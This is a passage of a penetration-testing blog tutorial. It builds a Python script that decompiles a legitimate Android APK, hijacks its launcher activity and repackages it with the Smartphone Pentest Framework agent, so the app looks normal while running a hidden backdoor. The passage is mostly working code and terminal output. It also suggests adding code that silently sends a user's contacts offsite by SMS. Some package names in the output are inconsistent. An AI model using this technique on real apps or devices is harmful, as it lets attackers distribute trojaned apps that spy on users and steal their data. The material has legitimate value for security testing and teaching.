<html><body><div><div class="entry">
				<p>One of the features of SPF is being able to take a compiled Android APK and refactor it to include the <a href="http://www.bulbsecurity.com/smartphone-pentest-framework/spf-user-guide/#SPF_Agents">SPF Agent.</a> Details of how to do this in SPF are in the SPF User manual <a href="http://www.bulbsecurity.com/smartphone-pentest-framework/spf-user-guide/#Building_SPF_Agents_Backdooring_APKs">Backdooring APKs section</a>. The resulting app looks and feels like the original app, but with some extra functionality. In this post we will explore how this is implemented in SPF and how you can extend it to meet your individual backdooring APK needs that may differ from the one size fits all approach of the current SPF Agent. A basic understand of the Python programming language will be assumed. </p>
<p>Also, the heavy lifting of Android reverse engineering will be performed by the third-party <a href="http://code.google.com/p/android-apktool/">Apktool</a>. SPF has a menu option for installing APKtool if you do not already have it. Choose option 10.) Install Stuff at the main menu then option 2.) Android APKTool.<br/>
<code><br/>
Select An Option from the Menu:</code></p>
<p>	 1.)  Attach Framework to a Deployed Agent/Create Agent<br/>
	 2.)  Send Commands to an Agent<br/>
	 3.)  View Information Gathered<br/>
	 4.)  Attach Framework to a Mobile Modem<br/>
	 5.)  Run a remote attack<br/>
	 6.)  Run a social engineering or client side attack<br/>
	 7.)  Clear/Create Database<br/>
	 8.)  Use Metasploit<br/>
	 9.)  Compile code to run on mobile devices<br/>
	10.)  Install Stuff<br/>
	11.)  Use Drozer<br/>
	 0.)  Exit</p>
<p>spf&gt; 10</p>
<p>What would you like to Install?<br/>
	1.) Android SDKS<br/>
	2.) Android APKTool<br/>
	3.) Download Android Nmap<br/>
spf&gt; 2</p>
<p>Install Android APKTool(y/N)?<br/>
spf&gt; y</p>
<p>--2014-01-13 14:54:57--  https://android-apktool.googlecode.com/files/apktool-install-linux-r05-ibot.tar.bz2<br/>
..snip..<br/>
<br/>
Apktool will be installed in the root SPF directory in a folder called apktool-install-linux-r05-ibot.</p>
<p>For this example I’ll use one of Google’s Demo Apps, though this method should be fairly universal. For example, I showed this technique on the local ABC News channel at Takedowncon Rocketcity using the official ABC News Android app. A compiled MapsDemo.apk can be found in the SPF repos at Smartphone-Pentest-Framework/APKs/MapsDemo.apk. </p>
<p>I’ll start with a directory with a backup of the SPF Android Agent that I want to use as a backdoor.<br/>
<code><br/>
root@kali:~# mkdir BackdoorExample<br/>
root@kali:~# cd BackdoorExample/<br/>
root@kali:~/BackdoorExample# cp -rf /root/Smartphone-Pentest-Framework/APKs/AndroidAgentBAK/ .<br/>
root@kali~/BackdoorExample#mv AndroidAndroidBAK AndroidAgent<br/>
root@kali:~/BackdoorExample# ls<br/>
AndroidAgent<br/>
</code></p>
<h2>Disassembling the APK</h2>
<p>Now I want to write a little Python program to put this inside of another APK. Let’s start by asking the user for the APK they want to backdoor. We will need the os Python module as we build our script, so I will go ahead and import it at the beginning of the script.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>#!/usr/bin/python </span>
<span>import</span> <span>os</span>
inputfile <span>=</span> <span>raw_input</span><span>(</span><span>'APK to Backdoor: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span></pre></td></tr></table></div>

<p>We are going to use Apktool a few times in this script to decompile and recompile APKs so let’s just create a variable to its location. Then we will use Apktool to decompile the APK we are backdooring. The syntax for decompiling with Apktool is d <apk to="" decompile="">. Apktool will create a directory in our current directory with the decompiled app.</apk></p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">apktoolloc <span>=</span> <span>"/root/Smartphone-Pentest-Framework/apktool-install-linux-r05-ibot/apktool"</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + inputfile<span>)</span></pre></td></tr></table></div>

<p>Run the script so we can look at the decompiled MapsDemo. Tell backdoor.py to backdoor the MapsDemo.apk app that is included as an example with SPF.<br/>
<code><br/>
root@kali:~/BackdoorExample# ./backdoor.py<br/>
APK to Backdoor: /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk<br/>
I: Baksmaling...<br/>
I: Loading resource table...<br/>
I: Loaded.<br/>
I: Decoding AndroidManifest.xml with resources...<br/>
I: Loading resource table from file: /root/apktool/framework/1.apk<br/>
I: Loaded.<br/>
I: Regular manifest package...<br/>
I: Decoding file-resources...<br/>
I: Decoding values */* XMLs...<br/>
I: Done.<br/>
I: Copying assets and libs...<br/>
root@kali:~/BackdoorExample# ls<br/>
AndroidAgent  backdoor.py  MapsDemo<br/>
</code><br/>
Change directories into the MapsDemo directory that has been created by Apktool and have a look around.<br/>
<code><br/>
root@kali:~/BackdoorExample/MapsDemo# ls<br/>
AndroidManifest.xml  apktool.yml  res  smali<br/>
</code><br/>
Just for comparison to see what Apktool does, take a compiled APK file, unzip it and compare the results. For example let’s copy over MapsDemo.apk and unzip it.<br/>
<code><br/>
root@kali:~/BackdoorExample# mkdir MapsDemocomplied<br/>
root@kali:~/BackdoorExample# cd MapsDemocomplied/<br/>
root@kali:~/BackdoorExample/MapsDemocomplied# cp /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk .<br/>
root@kali:~/BackdoorExample/MapsDemocomplied# unzip MapsDemo.apk<br/>
Archive:  MapsDemo.apk<br/>
 extracting: res/drawable/app_sample_code.png<br/>
  inflating: res/layout/mapview.xml<br/>
inflating: AndroidManifest.xml<br/>
 extracting: resources.arsc<br/>
  inflating: classes.dex<br/>
  inflating: META-INF/MANIFEST.MF<br/>
  inflating: META-INF/CERT.SF<br/>
  inflating: META-INF/CERT.RSA<br/>
root@kali:~/BackdoorExample/MapsDemocomplied# ls<br/>
AndroidManifest.xml  classes.dex  MapsDemo.apk  META-INF  res  resources.arsc<br/>
</code><br/>
We have AndroidManifest.xml here as well as the res directory. We also have META-INF, resources.arsc, and classes.dex which are not in the decompiled MapsDemo folder. Classes.dex is the compiled Dalvik dex code of the MapsDemo app. In addition to the code itself being compiled, other files such as our AndroidManifest.xml and the resources such as any pictures or layouts that are used are compiled as well.<br/>
<code><br/>
root@kali:~/BackdoorExample/MapsDemocomplied# cd res<br/>
root@kali:~/BackdoorExample/MapsDemocomplied/res# ls<br/>
drawable  layout  raw<br/>
root@kali:~/BackdoorExample/MapsDemocomplied/res# cd layout/<br/>
root@kali:~/BackdoorExample/MapsDemocomplied/res/layout# ls<br/>
mapview.xml<br/>
root@kali:~/BackdoorExample/MapsDemocomplied/res/layout# cat mapview.xml<br/>
    �<br/>
      $BTjz���  F  id<br/>
layout_heightenabled layclickable apiKeyandroid*http://schemas.android.com/apk/res/android<br/>
          LinearLayout¬com.google.android.maps.MapView<br/>
apisamples� �  �  �    �          ����    ` ��������	   ���   ��� ���� ��� ����   � ��������<br/>
   ��� ���� ��� ���� ��� ���� ��� ����</code></p>
<p>                                           ��������<br/>
    ¬��������	    ¬����<br/>
<br/>
Looking back at the decompiled version we will see that AndroidManifest.xml and the resources are now in plaintext.<br/>
<code><br/>
root@kali:~/BackdoorExample/MapsDemocomplied/res/layous/layout/../../MapsDemo/res/layout/<br/>
root@kali:~/BackdoorExample/MapsDemo/res/layout# cat mapview.xml<br/>
<br/>
<linearlayout android:id="@id/main" android:layout_width="fill_parent" android:layout_height="fill_parent" xmlns:android="http://schemas.android.com/apk/res/android"><br/>
    <com.google.android.maps.mapview android:enabled="true" android:clickable="true" android:layout_width="fill_parent" android:layout_height="fill_parent" android:apikey="apisamples"/><br/>
</linearlayout>root@kali:~/BackdoorExample/MapsDemo/res/layout#<br/>
</code><br/>
Additionally, classes.dex has been replaced with the smali directory.  You can learn more about <a href="http://code.google.com/p/smali/">Smali</a>, but basically it’s a more human readable translation of Dalvik dexcode. For example take a look at MapsDemo.smali in the smali/com/example/android/apis<br/>
<code><br/>
root@kali:~/BackdoorExample/MapsDemo/smali/com/example/android/apis# cat MapsDemo.smali<br/>
.class public Lcom/example/android/apis/MapsDemo;<br/>
.super Landroid/app/ListActivity;<br/>
.source "MapsDemo.java"<br/>
# static fields<br/>
.field private static final sDisplayNameComparator:Ljava/util/Comparator;<br/>
    .annotation system Ldalvik/annotation/Signature;<br/>
        value = {<br/>
            "Ljava/util/Comparator",<br/>
            "</code></p>
<p>It doesn’t look much like Java or probably any other programming language you’ve encountered but you may notice a few things that look familiar such as a ListActivity which as the name implies is an Android <a href="http://developer.android.com/reference/android/app/Activity.html">Activity</a> specifically designed to make a list. You will not need any Smali skills for this backdooring technique. We will look at editing Smali code directly in a later post. </p>
<h2>Backdooring our Agent with the Origonal App</h2>
<p>For now we will instead edit the source code in our AndroidAgent folder, backdooring our backdoor with the original app if you will. We will talk about working with Smali code in a later post, but regardless of whether you are a Smali expert, the code you encounter for each decompiled app will be at least slightly different. While in many cases it may be simple to add Smali code to start backdoor code automatically in the original app's Smali code, doing this programmatically for any app will be difficult if not impossible. We will discuss issues with this approach such as how Smali handles local variables in a later post. I chose to solve this issue by instead taking the Java source code of my Android Agent backdoor and adding code to automatically start the original app. To the user, my backdoored app will look and feel like the original, but will have the backdoor functionality added. Also, using this method the backdooring algorithm will be the same regardless of the Smali code encountered in the original app. </p>
<p>We are going to need to add all of the SPF Agent functionality to the Maps Demo app, but there are two pieces of the Agent that run automatically and thus may take more oversight than simply dropping an additional class into the Maps Demo app and adding a reference to it in AndroidManifest.xml. These are the communication methods. SPF Agents can currently communicate over SMS and HTTP. The SMS communication method is discussed in <a href="http://www.bulbsecurity.com/pivoting-a-shell-through-android-with-sms/">this post</a> and consists of setting up a <a href="http://developer.android.com/reference/android/content/BroadcastReceiver.html">BroadcastReceiver</a> to listen for an SMS received and intercepting it before the main SMS app receives it. Adding this will be pretty straightforward as the broadcast receiver automatically listens in the background regardless of whether the app is currently running. On the other hand, the HTTP communication method periodically polls a webserver for instructions. Since this is active rather than passive, we will need to have our original app automatically start the polling process when the app starts. Though this example uses SMS and HTTP you could substitute any passive listener and active process and generalize this technique to fit your needs. For example, rather than periodically checking in with a web server, you could build some code that on startup copies the user’s contacts list and sends them offsite via SMS. You would need to edit the original app to start this process automatically when it starts.  Though the code would be different, the backdooring technique would be the same as we will use here.</p>
<h2>Finding the Main Activity</h2>
<p>In order to run some code automatically when the backdoored app starts, but still have it look and feel like the original app to the user, we need to add our malicious code (or a call to it) to the method that is called when the user starts the application (typically the onCreate() method in the main Activity). We can find what class is called when the app starts easily by looking at the decompiled AndroidManifest.xml and looking for the lines</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="xml"><span><span>&lt;intent-filter<span>&gt;</span></span></span>
    <span><span>&lt;category</span> <span>android:name</span>=<span>"android.intent.category.LAUNCHER"</span> <span>/&gt;</span></span>
    <span><span>&lt;action</span> <span>android:name</span>=<span>"android.intent.action.MAIN"</span> <span>/&gt;</span></span>
<span><span>&lt;/intent-filter<span>&gt;</span></span></span></pre></td></tr></table></div>

<p>Looking at the AndroidManifest.xml file for MapsDemo we see this intent-filter entry under this interface declaration:</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="xml"><span><span>&lt;activity</span> <span>android:label</span>=<span>"MapsDemo"</span> <span>android:name</span>=<span>"com.example.android.apis.MapsDemo"</span><span>&gt;</span></span></pre></td></tr></table></div>

<p>This tells us that the class MapsDemo in the package com.example.android.apis is called when the app starts. But we want to be able to do this programmatically, not just for this app, so we need to look at XML parsing in Python.  First we need to add an import statement at the top to bring in the xml.etree.ElementTree library. I have imported it as ET so I can say ET instead of all that when I want to call it.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>import</span> <span>xml</span>.<span>etree</span>.<span>ElementTree</span> <span>as</span> ET</pre></td></tr></table></div>

<p>Now we need to open AndroidManifest.xml as an ET and look for</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="xml"><span><span>&lt;intent-filter<span>&gt;</span></span></span>
     <span><span>&lt;category</span> <span>android:name</span>=<span>"android.intent.category.LAUNCHER"</span> <span>/&gt;</span></span>
     <span><span>&lt;action</span> <span>android:name</span>=<span>"android.intent.action.MAIN"</span> <span>/&gt;</span></span>
<span><span>&lt;/intent-filter<span>&gt;</span></span></span></pre></td></tr></table></div>

<p>First I want to take that inputfile we used earlier and get the folder name that Apktool created. We can do this easily with Python’s os.path.split. Our original entry was /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk. So the file variable will be set to MapsDemo.apk in the code below. We can strip off the .apk with file[:-4] as shown below and set the foldername variable to MapsDemo.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">path<span>,</span><span>file</span> <span>=</span> <span>os</span>.<span>path</span>.<span>split</span><span>(</span>inputfile<span>)</span>
foldername <span>=</span> <span>file</span><span>[</span>:-<span>4</span><span>]</span></pre></td></tr></table></div>

<p>Now let’s look in that folder for AndroidManifest.xml and open it as an ET.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">ET.<span>register_namespace</span><span>(</span><span>"android"</span><span>,</span> <span>"http://schemas.android.com/apk/res/android"</span><span>)</span>
tree <span>=</span> ET.<span>ElementTree</span><span>(</span><span>)</span>
tree.<span>parse</span><span>(</span>foldername + <span>"/AndroidManifest.xml"</span><span>)</span>
root <span>=</span> tree.<span>getroot</span><span>(</span><span>)</span></pre></td></tr></table></div>

<p>A standard entry for Android Manifest files is package, which as the name implies will list the package. Let’s grab this while we are here. Why it is possibly important to us will become clear a bit later on.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">package <span>=</span> root.<span>get</span><span>(</span><span>'package'</span><span>)</span>
<span>print</span> package</pre></td></tr></table></div>

<p>Now we need to look through the XML and find the <application> tag. Its children will include the various interfaces for the app (services, activities, receivers, etc.) We want to find the child activity with the intent-filter entry to signify it is the main activity. Code to do this is shown below. Once we find the correct interface we set the variable mainact equal to that name. Then we break since we are done looking and don’t need to examine any more XML entries. In the code below I have added print statements to print out the package and the main activity to the console.</application></p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>for</span> child <span>in</span> root:
     <span>if</span> child.<span>tag</span> <span>==</span> <span>"application"</span>:
          app <span>=</span> child
          <span>for</span> child <span>in</span> app:
               <span>if</span> child.<span>tag</span> <span>==</span> <span>"activity"</span>:
                    act <span>=</span> child
                    <span>for</span> child <span>in</span> act:
                         <span>if</span> child.<span>tag</span> <span>==</span> <span>"intent-filter"</span>:
                              <span>filter</span> <span>=</span> child
                              <span>for</span> child <span>in</span> <span>filter</span>:  
                                   <span>if</span> <span>(</span><span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                        <span>if</span> <span>(</span><span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                             mainact <span>=</span>  act.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span>
					     <span>print</span> mainact
					     <span>break</span></pre></td></tr></table></div>

<p>Before running the updated script delete the MapsDemo folder as the script will recreate it.<br/>
<code><br/>
root@kali:~/BackdoorExample# rm -rf MapsDemo<br/>
</code><br/>
Now run the updated script. You will see the package is com.example.android.google.apis and the main activity is MapsDemo in that package. Comparing with our AndroidManifest.xml, this is correct.<br/>
<code><br/>
root@kali:~/BackdoorExample# ./backdoor.py<br/>
APK to Backdoor: /root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk<br/>
I: Baksmaling...<br/>
I: Loading resource table...<br/>
I: Loaded.<br/>
I: Decoding AndroidManifest.xml with resources...<br/>
I: Loading resource table from file: /root/apktool/framework/1.apk<br/>
I: Loaded.<br/>
I: Regular manifest package...<br/>
I: Decoding file-resources...<br/>
I: Decoding values */* XMLs...<br/>
I: Done.<br/>
I: Copying assets and libs...<br/>
com.example.android.google.apis<br/>
com.example.android.apis.MapsDemo<br/>
</code><br/>
I mentioned that the package attribute may or may not be important. In this case the activity name is written out with the full package name com.example.android.apis.MapsDemo. However, it is also acceptable for a developer to write this as .MapsDemo, and the package will be added automatically from the package attribute. Since we want to be able to backdoor any APK, we need to account for this. To check, I will just look and see if the first character in mainact is a period (.). If it is I will add the package to the front of mainact. I put this code before the break in the for loop.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>if</span> mainact<span>[</span><span>0</span><span>]</span> <span>==</span> <span>"."</span>:
                 mainact <span>=</span> package + mainact</pre></td></tr></table></div>

<p>So now we have the main activity we need to add our code to start the backdoor functionality. We only have the Smali code for this activity. Though it is possible to edit the Smali code to add our backdoor functionality, we may not be Smali experts, and it may be difficult to do this programmatically given the different code you will encounter in every main activity in every Android app ever made. Luckily we have a second option; instead of backdooring the original app with the SPF Agent, we will instead backdoor the SPF Agent with the original app. We have the source code for our AndroidAgent backdoor, and it will be the same every time, solving both of our problems. </p>
<p>While we are here, let’s take the first step in setting this up. We no longer want the main activity for MapsDemo to start automatically, the blank main activity for the SPF Agent will be our main activity instead. We will edit the main activity for the SPF Agent to automatically start MapsDemo's main activity. To the user everything will look normal. So while we have our AndroidManifest.xml open as an ET, let’s remove the intent-filter tag that signifies this is the main activity. When we add the SPF Agent interfaces to the manifest it will be added back in the correct place. Don’t forget to write the tree to a file to save your changes. Again put these lines before the break in the for loop.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"> act.<span>remove</span><span>(</span><span>filter</span><span>)</span>
 tree.<span>write</span><span>(</span><span>"output.xml"</span><span>)</span></pre></td></tr></table></div>

<p>Now back outside of the loops, if statements, etc. move output.xml to overwrite AndroidManifest.xml.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python"><span>os</span>.<span>system</span><span>(</span><span>"mv output.xml "</span> + foldername  + <span>"/AndroidManifest.xml"</span><span>)</span></pre></td></tr></table></div>

<p>The script should currently read:</p>

<div class="wp_syntax"><table><tr><td class="line_numbers"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="code"><pre class="python"><span>#!/usr/bin/python </span>
<span>import</span> <span>os</span>
<span>import</span> <span>xml</span>.<span>etree</span>.<span>ElementTree</span> <span>as</span> ET
inputfile <span>=</span> <span>raw_input</span><span>(</span><span>'APK to Backdoor: '</span><span>)</span>.<span>strip</span><span>(</span><span>)</span>
apktoolloc <span>=</span> <span>"/root/Smartphone-Pentest-Framework/apktool-install-linux-r05-ibot/apktool"</span>
<span>os</span>.<span>system</span><span>(</span>apktoolloc + <span>" d "</span> + inputfile<span>)</span>
path<span>,</span><span>file</span> <span>=</span> <span>os</span>.<span>path</span>.<span>split</span><span>(</span>inputfile<span>)</span>
foldername <span>=</span> <span>file</span><span>[</span>:-<span>4</span><span>]</span>
ET.<span>register_namespace</span><span>(</span><span>"android"</span><span>,</span> <span>"http://schemas.android.com/apk/res/android"</span><span>)</span>
tree <span>=</span> ET.<span>ElementTree</span><span>(</span><span>)</span>
tree.<span>parse</span><span>(</span>foldername + <span>"/AndroidManifest.xml"</span><span>)</span>
root <span>=</span> tree.<span>getroot</span><span>(</span><span>)</span>
package <span>=</span> root.<span>get</span><span>(</span><span>'package'</span><span>)</span>
<span>print</span> package
<span>for</span> child <span>in</span> root:
     <span>if</span> child.<span>tag</span> <span>==</span> <span>"application"</span>:
          app <span>=</span> child
          <span>for</span> child <span>in</span> app:
               <span>if</span> child.<span>tag</span> <span>==</span> <span>"activity"</span>:
                    act <span>=</span> child
                    <span>for</span> child <span>in</span> act:
                         <span>if</span> child.<span>tag</span> <span>==</span> <span>"intent-filter"</span>:
                              <span>filter</span> <span>=</span> child
                              <span>for</span> child <span>in</span> <span>filter</span>:  
                                   <span>if</span> <span>(</span><span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>0</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                        <span>if</span> <span>(</span><span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.category.LAUNCHER"</span> <span>or</span>  <span>filter</span><span>[</span><span>1</span><span>]</span>.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span> <span>==</span> <span>"android.intent.action.MAIN"</span><span>)</span>:
                                             mainact <span>=</span>  act.<span>get</span><span>(</span><span>'{http://schemas.android.com/apk/res/android}name'</span><span>)</span>
					     <span>if</span> mainact<span>[</span><span>0</span><span>]</span> <span>==</span> <span>"."</span>:
                                                  mainact <span>=</span> package + mainact
                                             <span>print</span> mainact
					     act.<span>remove</span><span>(</span><span>filter</span><span>)</span>
                                             tree.<span>write</span><span>(</span><span>"output.xml"</span><span>)</span>
					     <span>break</span>
<span>os</span>.<span>system</span><span>(</span><span>"mv output.xml "</span> + foldername  + <span>"/AndroidManifest.xml"</span><span>)</span></pre></td></tr></table></div>

<p>If you run the script and look at AndroidManifest.xml, you will see that the intent-filter tag for the main activity has been removed. </p>
<h2>Starting MapsDemo from our Agent Backdoor Code</h2>
<p>Now that we have found the main activity, we need to automatically start it. We will add an <a href="http://developer.android.com/reference/android/content/Intent.html">Intent</a> to start the MapsDemo main activity in the onCreate() method in the main activity of the SPF Agent. In the AndroidAgent folder go to src/com/bulbsecurity/framework to find the source code. AndroidAgentActivity is the main activity. The onCreate() method is shown below.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="java"><span>public</span> <span>class</span> AndroidAgentActivity <span>extends</span> Activity <span>{</span>
    <span>/** Called when the activity is first created. */</span>
    @Override
    <span>public</span> <span>void</span> onCreate<span>(</span>Bundle savedInstanceState<span>)</span> <span>{</span>
        <span>super</span>.<span>onCreate</span><span>(</span>savedInstanceState<span>)</span><span>;</span>
        Log.<span>i</span><span>(</span><span>"AAA"</span>, <span>"Main Activity Started"</span><span>)</span><span>;</span>
        Intent intent <span>=</span> <span>new</span> Intent<span>(</span>getApplicationContext<span>(</span><span>)</span>,ServiceAutoStarterr.<span>class</span><span>)</span><span>;</span>
       sendBroadcast<span>(</span>intent<span>)</span><span>;</span>
       Log.<span>i</span><span>(</span><span>"AAA"</span>, <span>"Broadcast sent"</span><span>)</span><span>;</span>
      finish<span>(</span><span>)</span><span>;</span>
<span>}</span></pre></td></tr></table></div>

<p>This code logs a couple things for debugging and starts the ServiceAutoStarterr class which sets the timer to automatically poll the webserver periodically. Finally we call finish() to shutdown this activity. </p>
<p>We want to add any Intent to start the main activity of MapsDemo right before the finish(). We are going to use regular expressions to match strings so we will need to add another import statement to the start of the script.</p>



<p>Now we need to calculate a few strings. Let’s take mainact and split it on periods (.). This will allow us to make the full package, the classname regardless of how this was set up in the manifest.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">mainactsplit <span>=</span> mainact.<span>split</span><span>(</span><span>"."</span><span>)</span>
length <span>=</span> <span>len</span><span>(</span>mainactsplit<span>)</span>
classname <span>=</span> mainactsplit<span>[</span>length - <span>1</span><span>]</span>
package <span>=</span> mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"."</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>2</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"."</span>
     package +<span>=</span> add
package +<span>=</span> mainactsplit<span>[</span>length - <span>2</span><span>]</span></pre></td></tr></table></div>

<p>In our case package will be com.example.android.google.apis and classname will be MapsDemo. The string to denote our MapsDemo class in the Intent we will add to AndroidAgentActivity is package + classname with .class at the end. Finally, the file we need to edit is AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">appmain <span>=</span> package + <span>"."</span> + classname + <span>".class"</span>
mainfile <span>=</span> <span>"AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"</span></pre></td></tr></table></div>

<p>Now we need to use regular expressions to add the following code right before the finish() in the onCreate() method of AndroidAgentActivity.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="java">Intent intent2 <span>=</span> <span>new</span> Intent<span>(</span>getApplicationContext<span>(</span><span>)</span>,  <span>&lt;</span>appmain<span>&gt;</span><span>)</span><span>;</span>
startActivity<span>(</span>intent2<span>)</span><span>;</span></pre></td></tr></table></div>

<p>Inject the code with regular expressions as shown below</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">inject <span>=</span> <span>"<span>\n</span>        Intent intent2 = new Intent(getApplicationContext(), "</span> + appmain +  <span>");<span>\n</span>startActivity(intent2);<span>\n</span>"</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'r'</span><span>)</span> <span>as</span> f:
     fc <span>=</span> f.<span>read</span><span>(</span><span>)</span>
<span>with</span> <span>open</span><span>(</span>mainfile<span>,</span> <span>'w'</span><span>)</span> <span>as</span> f:
     f.<span>write</span><span>(</span><span>re</span>.<span>sub</span><span>(</span>r<span>'(finish)'</span><span>,</span> r<span>'%s<span>\1</span>'</span>%inject<span>,</span> fc<span>,</span> count<span>=</span><span>1</span><span>)</span><span>)</span></pre></td></tr></table></div>

<p>The only trouble is we need to compile this code, and in its current state this code will throw an error that the class specified in this Intent does not exist. In order to get it to compile we just need to create a dummy class. We don’t even have to add it to the manifest for AndroidAgent as this code will never actually be run. It is just going to be used to backdoor the MapsDemo app. </p>
<p>Our dummy class needs to go in the src directory following the convention of a folder for each level of the package. In our case we will make src/com/example/android/apis/.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">newfolder <span>=</span> <span>"src/"</span> + mainactsplit<span>[</span><span>0</span><span>]</span> + <span>"/"</span>
<span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span>
<span>for</span> x <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> <span>(</span>length - <span>1</span><span>)</span><span>)</span>:
     add <span>=</span> mainactsplit<span>[</span>x<span>]</span> + <span>"/"</span>
     newfolder +<span>=</span> add
     <span>os</span>.<span>system</span><span>(</span><span>"mkdir AndroidAgent/"</span> + newfolder<span>)</span></pre></td></tr></table></div>

<p>In the nearly created folder create a new file called MapsDemo.java in our case.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">fullclasspath <span>=</span>  <span>"AndroidAgent/"</span> + newfolder + classname + <span>".java"</span>
<span>os</span>.<span>system</span><span>(</span><span>"touch "</span> + fullclasspath<span>)</span></pre></td></tr></table></div>

<p>Again, this code won’t ever be run, the real main activity will be in place by the time we run the backdoored app, so we just need something that compiles here. We will add a simple Activity class skeleton here.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="python">f <span>=</span> <span>open</span><span>(</span>fullclasspath<span>,</span> <span>'w'</span><span>)</span>
line1 <span>=</span> <span>"package "</span> + package + <span>";<span>\n</span>"</span>
line2 <span>=</span> <span>"import android.app.Activity;<span>\n</span>"</span>
line3 <span>=</span> <span>"public class "</span> + classname + <span>" extends Activity {<span>\n</span>"</span>
line4 <span>=</span> <span>"}<span>\n</span>"</span>
f.<span>write</span><span>(</span>line1<span>)</span>
f.<span>write</span><span>(</span>line2<span>)</span>
f.<span>write</span><span>(</span>line3<span>)</span>
f.<span>write</span><span>(</span>line4<span>)</span>
f.<span>close</span><span>(</span><span>)</span></pre></td></tr></table></div>

<p>If you run the current script and then check the AndroidAgent folder you should notice a couple of changes. First the Intent to start MapsDemo’s main activity should be added before finish() in the onCreate() method in AndroidAgentActivity.</p>

<div class="wp_syntax"><table><tr><td class="code"><pre class="java"><span>public</span> <span>class</span> AndroidAgentActivity <span>extends</span> Activity <span>{</span>
    <span>/** Called when the activity is first created. */</span>
    @Override
    <span>public</span> <span>void</span> onCreate<span>(</span>Bundle savedInstanceState<span>)</span> <span>{</span>
        <span>super</span>.<span>onCreate</span><span>(</span>savedInstanceState<span>)</span><span>;</span>
        Log.<span>i</span><span>(</span><span>"AAA"</span>, <span>"Main Activity Started"</span><span>)</span><span>;</span>
        Intent intent <span>=</span> <span>new</span> Intent<span>(</span>getApplicationContext<span>(</span><span>)</span>,ServiceAutoStarterr.<span>class</span><span>)</span><span>;</span>
       sendBroadcast<span>(</span>intent<span>)</span><span>;</span>
       Log.<span>i</span><span>(</span><span>"AAA"</span>, <span>"Broadcast sent"</span><span>)</span><span>;</span>
        Intent intent2 <span>=</span> <span>new</span> Intent<span>(</span>getApplicationContext<span>(</span><span>)</span>, com.<span>example</span>.<span>apisandroid</span>.<span>apis</span>.<span>MapsDemo</span>.<span>class</span><span>)</span><span>;</span>
startActivity<span>(</span>intent2<span>)</span><span>;</span>
finish<span>(</span><span>)</span><span>;</span>    
    <span>}</span></pre></td></tr></table></div>

<p>Also the file src/com/example/android/apis/MapsDemo.java with the following code.<br/>
<code><br/>
root@kali:~/BackdoorExample/AndroidAgent/src/com/example/android/apis# cat MapsDemo.java<br/>
package com.example.apisandroid.apis;<br/>
import android.app.Activity;<br/>
public class MapsDemo extends Activity {<br/>
}<br/>
</code><br/>
